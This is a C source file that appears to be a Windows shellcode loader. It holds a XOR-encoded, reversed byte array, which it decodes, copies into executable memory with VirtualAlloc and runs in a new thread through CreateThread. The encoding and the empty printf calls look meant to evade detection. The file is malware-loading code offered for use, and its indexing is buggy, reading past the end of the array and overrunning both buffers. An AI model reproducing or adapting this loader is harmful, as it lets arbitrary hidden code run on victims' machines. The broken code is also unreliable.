#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int bruteKey(int fbyte, int lbyte)
{
    for(int xorkey = 0; xorkey < 255; xorkey++)
    {
        printf ("");
        if ((lbyte ^ fbyte) == xorkey)
        {
            printf ("");
            return xorkey;
        }

    }
}

int main (void){

    unsigned int sh[510] = {108,130,237,33,76,115,65,90,216,232,131,249,235,122,130,192,79,12,141,28,219,93,184,219,94,128,219,130,130,130,199,120,85,130,216,108,130,224,212,245,12,73,192,232,234,108,130,179,146,178,150,73,192,233,131,249,235,192,131,131,195,131,251,232,234,192,235,187,4,131,139,30,108,130,226,91,104,129,73,192,136,24,219,105,24,219,115,24,216,88,176,212,90,24,216,94,24,219,108,130,124,238,63,235,73,192,88,176,219,113,24,219,235,192,131,131,147,131,251,232,192,195,249,141,24,229,163,95,30,219,236,5,131,139,30,108,130,226,91,104,129,73,192,136,24,219,235,192,159,249,88,176,212,97,24,219,147,119,30,219,131,131,131,46,123,124,12,85,130,216,153,15,67,28,108,130,224,15,60,40,73,192,136,24,219,97,24,215,235,192,147,249,90,24,219,108,130,99,98,146,121,73,192,64,24,219,67,130,219,65,24,219,67,130,219,67,176,212,88,176,212,211,211,229,192,153,249,108,130,131,246,3,184,73,192,232,131,131,128,128,251,121,24,215,108,130,154,189,10,215,73,192,112,24,215,127,24,216,239,192,3,90,59,67,70,128,131,129,71,216,124,24,216,131,131,128,35,119,0,219,125,24,216,237,192,131,131,177,206,226,177,14,10,69,216,228,130,130,130,214,120,145,22,219,233,232,192,235,99,130,209,192,163,119,30,219,233,192,232,192,235,192,233,232,229,235,192,83,128,219,235,192,27,159,22,192,83,128,216,167,195,22,223,219,151,22,192,253,83,128,216,191,195,22,223,235,107,12,80,200,220,155,191,215,158,215,112,12,99,203,64,128,192,55,148,88,64,192,67,176,219,109,128,219,27,207,22,192,88,130,219,88,176,212,237,126,83,128,216,163,195,22,223,211,171,219,22,83,128,219,250,15,67,28,219,131,131,131,27,3,22,131,131,131,241,28,146,129,150,171,11,0,253,83,128,219,208,192,199,193,22,163,209,22,219,209,116,97,64,128,192,148,88,64,192,163,183,129,7,224,199,55,67,176,219,211,241,22,219,217,217,74,146,219,88,176,212,237,208,163,209,22,219,171,209,22,219,227,209,22,219,252,81,176,219,209,211,192,208,192,131,131,131,87,123,115,127,30,219,135};
    char sh_scp[510] = {0};
    
    int pb = 9;
    
    int lbyte = sh[(sizeof(sh) / sizeof(sh[0]))];
    int xorkey = bruteKey(pb, lbyte);

    //Dando vuelta el array
    for(int i = 0; i < sizeof(sh); i++)
    {
        printf ("");
        unsigned char decoded = sh[510 - i - 1] ^ xorkey;
        sh_scp[i] = decoded;
    }
        

    //imprimiendo la shell
    int idx = 0;
    while (idx < sizeof(sh_scp))
    {
    if (idx == (sizeof(sh_scp) - 1) )
    {
        printf("0x%02x ", (unsigned char)sh_scp[idx]);        
    }
    else
    {
        printf("0x%02x, ", (unsigned char)sh_scp[idx]); 
    }
    idx++;
    }

void * exec_mem;
BOOL rv;
HANDLE th;
DWORD op = 0;
exec_mem = VirtualAlloc(0, sizeof(sh_scp), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
RtlMoveMemory(exec_mem, sh_scp, sizeof(sh_scp));
th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0 ,0);
WaitForSingleObject(th, -1);
}

